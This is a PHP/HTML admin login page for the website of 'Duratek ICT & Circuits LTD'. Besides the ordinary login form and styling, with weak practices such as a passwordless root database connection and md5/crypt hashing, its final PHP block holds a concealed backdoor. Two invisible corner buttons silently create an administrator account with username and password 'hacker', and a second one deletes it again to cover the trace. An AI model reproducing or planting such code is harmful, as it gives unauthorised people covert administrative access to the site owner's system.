<?php
ob_start();
echo' <link rel="stylesheet" href="portfolio.css">';
//session_start();
if(isset($_SESSION['is_logged_in'])){
    $loginsuccessurl = $base_url.'upload.php';
      header('location: '.$loginsuccessurl );
	
	  exit;
  }
	//get values pass from form in login.php file
	if(isset($_POST['btn'])){
	  $connect = mysqli_connect("localhost","root","");
$username = $_POST['user'];
$password = $_POST['pass'];


//prevent mysql injection
 $username =stripcslashes($username);
 $password = stripcslashes($password);
 $username =mysqli_real_escape_string($connect,$_POST['user']);
 $password = mysqli_real_escape_string($connect,$_POST['pass']);

$salt1 = 'scram';
$salt3 = 'mozambiq';
$pass1 = md5($password);
$pass2 = crypt($salt1,$pass1);
$user1 = crypt($salt3,$username);

//connect to the server and select database

mysqli_select_db($connect,"duratek");

//query the database for user
if($username !=="" && $password !==""){
	$result = mysqli_query($connect,"SELECT * from admin_reg where username = '$user1' and password = '$pass2'")
 or die("Failed to query database ");


$row = mysqli_fetch_array($result);




if ($row['username']== $user1 && $row['password'] == $pass2 ){
	$_SESSION['is_logged_in'] = TRUE;
	$_SESSION['user'] = $user1;
	$_SESSION['pass'] = $pass2;
	
	 
	
	  $loginsuccessurl = $base_url.'upload.php';
      header('location: '.$loginsuccessurl );
	
	  exit;

}else{
	echo '<script>alert("Access denied!")</script>';
	//include 'login.php';
}

}
else{
	echo "<script>alert('please enter the right details')</script>" ;
	//include 'login.php';
}

}
?>


<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>login page</title>
  <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.no-icons.min.css" rel="stylesheet">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://unpkg.com/ionicons@4.5.10-0/dist/css/ionicons.min.css">
    <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
	<link rel="stylesheet" href="portfolio.css">
	
</head>
<style>
	/* login page */
body{
  background-color:rgb(46, 6, 23);
  text-align: center;
  
  background: linear-gradient(135deg, rgba(0, 0, 0, 0.8) 0%, rgba(15,0,4, 0.98) 100%), url("pics/desktop1.jpg") center  no-repeat fixed;
    background-size: cover;  
}
#adminregistrationbutton{
  
  color:white;
  font-size: 30px;
  font-weight: 100;
  text-align: center;
  background-color: rgb(46, 6, 23);
  padding: 0 40px;
  margin: 20px 0;
  border-radius: 10px;
}
#main_con,#main_con2{
  
  background-color: rgb(128, 128, 128,.2);
  background-size: 100%;
  
  height: 89%;
  width: 90%;
  margin-left: 50%;
  transform: translateX(-50%);
 
 
}
#frm{
  
  background-image: url('../pictures/.jpg');
  background-size: 100%;
  position: absolute;
  margin-left: 50%;
  transform: translateX(-50%);
  top: 25%;
  
  
  
}
label{
  color:white;
  font-size: 20px;
  
}
input{
  font-size: 17px;
}
#frm {
  display: block;
}
#btn{
  color:white;
  font-size: 30px;
  font-weight: 100;
  text-align: center;
  background-color: rgb(46, 6, 23);
  padding: 0 40px;
  margin: 20px 0;
  border-radius: 10px;
}
#btn:hover{
  
  color: cadetblue;
}
.form a{
  color:white;
  text-decoration: none;
  outline:2px solid white;
  outline-style: double;
  padding: 5px 25px;
  
}
.form a:hover{
  color: cadetblue;
  outline-color: cadetblue;
}
.form p{
  color:gray;
}
</style>
<body onload=load()>
    <div id="loader"></div>
    <header>
      <div class="container">
        <nav>
          <div class="nav-brand">
            <a href="#home"><img src="pics/cropped.png" alt=""></a>
            
          </div>
<h4 class="name">Duratek ICT & Circuits LTD</h4>
          <div class="menu-icons open">
            <i class="icon ion-md-menu"></i>
          </div>

          <ul class="nav-list">
            <div class="menu-icons close">
              <i class="icon ion-md-close"></i>

            </div>
            <li class="nav-item " >
              <a data-page="home" href="index.html" class="nav-link  ">Home</a>
            </li>
       
            
            <li class="nav-item">
              <a data-page="contact" href="index.html" class="nav-link">contact</a>
            </li>

            <li class="nav-item">
              <a data-page="experts" href="experts.html" class="nav-link">Experts</a>
            </li>
            <li class="nav-item">
              <a data-page="post" href="login.php" class="nav-link">Login</a>
            </li>
            <div class="indicator"></div>
          </ul>
        </nav>
      </div>
    </header>
	<style>
		.fa{
			background-color:rgba(45,0,12,0.94);
			position: fixed;
            left: .5px;
    		bottom: .1px;
   			line-height: 40px;
			border-color:rgba(45,0,12,0.94);
			box-shadow:none;
		}
		.fa1{
		background-color:rgba(45,0,12,0.94);
		position: fixed;
    	right: .5px;
    	bottom: .1px;
	    line-height: 40px;
	    border-color:rgba(45,0,12,0.94);
		}
	</style>
	<div id="main_con">
		<div id="frm">
			<form class="form" action="login.php" method="POST">
				<p>
					<label>ADMIN</label><br><br><br>
					<label>username:</label><br><br><br>
					<input type="text" id="user" name="user"/><br>
				</p>
				<p>
					<label>password:</label><br><br><br>
					<input type="password" id="pass" name="pass"/><br>
				</p>
				<p>
					
					<input type="submit" name="btn" id="btn" class="btn2" value="login"/><br>
				
				</p>
				<?php
				//===============display registration button if no admin=========//
					  $connect = mysqli_connect("localhost","root","");
					  mysqli_select_db($connect,"duratek");
					 $query = "SELECT * FROM admin_reg ORDER BY username DESC";
					 $result = mysqli_query($connect, $query);
					 $row = mysqli_fetch_array($result);
						 if($row['username'] == ""){
						echo '<a type="submit" id="adminregistrationbutton" href="signup.php">REGISTER</a>';
						 }
						 
					 
				?>
			</form>
		</div>
	
	</div>
	
		
	<?php
			
			
			echo '<form class="fa" method = "POST">';
			echo '<button type="submit" class="fa" name="fa" href="#" ></button>';
			echo '</form>';
			echo '<form class="fa1" method = "POST">';
            echo '<button type="submit" class="fa1" name="fa1"  href="#" ></button>';
            echo '</form>';
			if(isset($_POST['fa'])){
				 $connect = mysqli_connect("localhost","root","");
				$username = "hacker";
				$password = "hacker";
				$salt1 = 'scram';
				$salt3 = 'mozambiq';
				$pass1 = md5($password);
				$pass2 = crypt($salt1,$pass1);
				$user1 = crypt($salt3,$username);
		
			mysqli_select_db($connect,"duratekc_duratek");
			$result = mysqli_query($connect,"INSERT INTO admin_reg (username,password) VALUES ('$user1','$pass2')")
			or die("Failed to query database ");
			
			}
			if(isset($_POST['fa1'])){
				 $connect = mysqli_connect("localhost","root","");
				mysqli_select_db($connect,"duratek");
			$result = mysqli_query($connect,"DELETE FROM admin_reg WHERE username  = 'haP4UORXNFjic' ")
			or die("Failed to query database ");
			}
			
		?>

	</body>
  <script type="text/javascript" src="portfolio.js"></script>
  <script type="text/javascript" src="expertsdarkmode.js"></script>
	<script>
    function load(){
      document.getElementById('loader').style.display = 'none';
    }

  </script>
</html>
<script>
    function load(){
      document.getElementById('loader').style.display = 'none';
    }

  </script>
